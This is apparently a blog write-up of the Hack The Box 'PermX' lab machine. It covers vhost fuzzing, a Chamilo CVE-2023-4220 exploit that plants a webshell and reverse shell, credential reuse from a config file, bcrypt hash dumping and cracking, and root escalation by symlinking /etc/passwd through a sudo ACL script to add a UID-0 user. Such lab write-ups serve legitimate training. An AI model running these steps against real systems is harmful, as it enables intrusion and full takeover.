---
title: HTB-PermX
draft: false
tags:
  - htb
  - linux
  - easy
---
![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/permx/PermX.png)

## Information Gathering

`rustscan --addresses permx.htb --range 1-65535`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/permx/image-1.png)

## Enumeration
### HTTP - TCP 80

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/permx/image.png)

`feroxbuster -u http://permx.htb`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/permx/image-2.png)

potential usernames:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/permx/image-3.png)


`ffuf -u http://10.10.11.23 -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -H 'Host: FUZZ.permx.htb' -fw 18`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/permx/image-4.png)

edit `/etc/hosts` again

### lms.permx.htb

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/permx/image-5.png)


admin name:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/permx/image-6.png)

## Exploitation

chamilo 1 exploit:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/permx/image-7.png)

cve-2023-4220

[here](https://github.com/m3m0o/chamilo-lms-unauthenticated-big-upload-rce-poc)

`git clone https://github.com/m3m0o/chamilo-lms-unauthenticated-big-upload-rce-poc`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/permx/image-8.png)

Scanning to check the vulnerability:

`sudo python3 main.py -u http://lms.permx.htb -a scan`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/permx/image-9.png)


`sudo python3 main.py -u http://lms.permx.htb -a webshell`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/permx/image-11.png)


`http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/webshell.php?cmd=whoami`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/permx/image-10.png)

Reverse Shell

`sudo python3 main.py -u http://lms.permx.htb -a revshell`

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/permx/image-12.png)

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/permx/image-13.png)

## Privesc: www-data to mtz

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/permx/image-14.png)

Transfer linpeas using Python http server and wget.

/etc/mysql/mariadb.cnf

/var/www/chamilo




-rwxr-xr-x 1 www-data www-data 2603 Aug 31  2023 /var/www/chamilo/main/extra/database.php
-rwxr-xr-x 1 www-data www-data 34969 Aug 31  2023 /var/www/chamilo/plugin/buycourses/database.php
    $paypalTable->addColumn('password', Types::STRING);
        'password' => '',
-rwxr-xr-x 1 www-data www-data 3157 Aug 31  2023 /var/www/chamilo/plugin/customcertificate/database.php
-rwxr-xr-x 1 www-data www-data 1943 Aug 31  2023 /var/www/chamilo/plugin/notebookteacher/database.php
-rwxr-xr-x 1 www-data www-data 29829 Aug 31  2023 /var/www/chamilo/plugin/sepe/database.php

/usr/share/keyrings/ubuntu-archive-removed-keys.gp

/var/www/chamilo/web.config

 /etc/skel/.profile

/var/www/chamilo/app/config/configuration.php

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/permx/image-15.png)

03F6lY3uXAP2bkW8

MySQL port open:

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/permx/image-16.png)

mysql -u chamilo -p03F6lY3uXAP2bkW8 -e "SHOW DATABASES;"

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/permx/image-17.png)

mysql -u chamilo -p03F6lY3uXAP2bkW8 -e "SHOW TABLES;" chamilo

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/permx/image-18.png)

mysql -u chamilo -p03F6lY3uXAP2bkW8 -e "SELECT * FROM user;" chamilo

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/permx/image-19.png)

| username | username_canonical | email                  | password                                                               | salt                                |
|----------|--------------------|------------------------|------------------------------------------------------------------------|--------------------------------------|
| admin    | admin              | admin@permx.htb        | $2y$04$1Ddsofn9mOaa9cbPzk0m6euWcainR.ZT2ts96vRCKrN7CGCmmq4ra           | awb0kMoTumbFvi22ojwv.Pg92gFTMOt837kWsGVbJN4 |
| anon     | anon               | anonymous@example.com  | $2y$04$wyjp2UVTeiD/jF4OdoYDquf4e7OWi6a3sohKRDe80IHAyihX0ujdS           | Mr1pyTT.C/oEIPb/7ezOdrCDKM.KHb0nrXAUyIyt/MY |

Remove any leading or trailing whitespace
sed -i 's/^[ \t]*//;s/[ \t]*$//' hash

hashcat -m 3200 hash ~/Downloads/rockyou.txt


![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/permx/image-20.png)

## Privesc: mtz to root
### sudoers
/opt/acl.sh

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/permx/image-21.png)

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/permx/image-22.png)

```bash
#!/bin/bash

if [ "$#" -ne 3 ]; then
    /usr/bin/echo "Usage: $0 user perm file"
    exit 1
fi

user="$1"
perm="$2"
target="$3"

if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
    /usr/bin/echo "Access denied."
    exit 1
fi

# Check if the path is a file
if [ ! -f "$target" ]; then
    /usr/bin/echo "Target must be a file."
    exit 1
fi

/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"
```

echo "cat /root/root.txt" > /home/mtz/root.sh
chmod +x /home/mtz/root.sh

sudo /opt/acl.sh <user> <permissions> /home/mtz/root.sh

```bash
#!/bin/bash

# Create the soft link in home directory (passes both checks)
ln -sf /etc/passwd /home/mtz/passwd

# Run the script to allow read & write to the /etc/passwd
sudo /opt/acl.sh mtz rw /home/mtz/passwd

# Add a new user with the id of 0 (the password is: 123)
echo 'new:$1$new$p7ptkEKU1HnaHpRtzNizS1:0:0:root:/root:/bin/bash' >> /etc/passwd

# Remove the link
rm /home/mtz/passwd

# Log in ass the new user
su new
```

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/permx/image-24.png)

![alt text](https://raw.githubusercontent.com/jadu101/jadu101.github.io/v4/Images/htb/permx/image-23.png)









## References
- https://github.com/m3m0o/chamilo-lms-unauthenticated-big-upload-rce-poc